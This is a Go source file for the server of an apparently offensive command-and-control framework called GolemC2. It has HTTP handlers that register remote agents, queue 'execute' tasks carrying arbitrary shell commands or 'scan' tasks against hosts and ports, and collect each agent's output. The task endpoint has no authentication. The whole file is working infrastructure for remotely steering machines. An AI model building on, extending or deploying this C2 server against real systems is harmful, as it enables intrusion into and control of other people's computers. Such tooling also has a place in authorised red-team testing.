package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/DUDLEYDANIEL/GolemC2/internal/agent/tasks"
	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

var store *InMemoryStore

func ToServerTask(agentTasksTask tasks.Task) Task {
	var cmd string
	var args []string
	if agentTasksTask.Type == "execute" {
		cmd = agentTasksTask.Params["command"]
	} else if agentTasksTask.Type == "scan" {
		cmd = fmt.Sprintf("scan --hosts=%s --ports=%s", agentTasksTask.Params["hosts"], agentTasksTask.Params["port"])
	} else {
		cmd = ""
	}
	return Task{
		ID:      agentTasksTask.ID,
		Command: cmd,
		Args:    args,
	}
}

func ToAgentTasks(serverTasks []Task) []tasks.Task {
	var agentTasks []tasks.Task
	for _, st := range serverTasks {
		fullCmd := st.Command
		if len(st.Args) > 0 {
			fullCmd += " " + strings.Join(st.Args, " ")
		}
		at := tasks.Task{
			ID:        st.ID,
			Type:      "execute",
			Params:    map[string]string{"command": fullCmd},
			CreatedAt: time.Now(),
		}
		agentTasks = append(agentTasks, at)
	}
	return agentTasks
}

func toServerResult(agentResult tasks.Result) Result {
	return Result{
		TaskID:    agentResult.TaskID,
		Output:    agentResult.Output, // string → string
		ExitCode:  agentResult.ExitCode,
		Completed: agentResult.Completed,
	}
}

func RegisterHandler(mux *mux.Router, s *InMemoryStore) {
	store = s

	mux.HandleFunc("/register", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			return
		}

		agentID := r.URL.Query().Get("agent_id")
		if agentID == "" {
			agentID = uuid.New().String()
		}

		store.UpdateAgentLastSeen(agentID, time.Now())

		w.Header().Set("Content-Type", "application/json")

		if err := json.NewEncoder(w).Encode(map[string]string{"agent_id": agentID}); err != nil {
			http.Error(w, "Failed to encode response", http.StatusInternalServerError)
		}
	})

	mux.HandleFunc("/tasks", func(w http.ResponseWriter, r *http.Request) {
		agentID := r.URL.Query().Get("agent_id")
		if agentID == "" {
			http.Error(w, "Missing agent_id", http.StatusBadRequest)
			return
		}
		if r.Method == http.MethodGet {
			serverTasks := store.GetTasks(agentID)
			agentTasks := ToAgentTasks(serverTasks)
			w.Header().Set("Content-Type", "application/json")
			if err := json.NewEncoder(w).Encode(agentTasks); err != nil {
				http.Error(w, "Failed to encode tasks", http.StatusInternalServerError)
			}
		} else if r.Method == http.MethodPost {
			var task tasks.Task
			if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
				http.Error(w, "Invalid request body", http.StatusBadRequest)
				return
			}
			if task.Type == "" || (task.Type != "execute" && task.Type != "scan") {
				http.Error(w, "Invalid Task type, type must be 'execute' or 'scan'", http.StatusBadRequest)
				return
			}
			if task.Type == "execute" && task.Params["command"] == "" {
				http.Error(w, "Missing 'command' in params for execute", http.StatusBadRequest)
				return
			}
			if task.Type == "scan" && (task.Params["host"] == "" || task.Params["port"] == "") {
				http.Error(w, "Missing 'host' or 'port' in params for scan", http.StatusBadRequest)
				return
			}
			task.ID = uuid.New().String()
			task.CreatedAt = time.Now()
			serverTask := ToServerTask(task)
			if err := store.AddTask(agentID, serverTask); err != nil {
				http.Error(w, "Failed to add task", http.StatusInternalServerError)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusCreated)
			if err := json.NewEncoder(w).Encode(map[string]string{"task_id": task.ID}); err != nil {
				http.Error(w, "Failed to encode response", http.StatusInternalServerError)
			}
		} else {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		}
	})

	mux.HandleFunc("/results", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		agentID := r.URL.Query().Get("agent_id")
		if agentID == "" {
			http.Error(w, "Missing agent_id", http.StatusBadRequest)
			return
		}

		var res tasks.Result
		if err := json.NewDecoder(r.Body).Decode(&res); err != nil {
			http.Error(w, "Invalid request body", http.StatusBadRequest)
			return
		}
		res.Completed = time.Now()
		serverRes := toServerResult(res)
		if err := store.AddResult(agentID, serverRes); err != nil {
			http.Error(w, "Failed to add result", http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusNoContent)
	})
}

func generateUUID() string {
	return uuid.New().String()
}
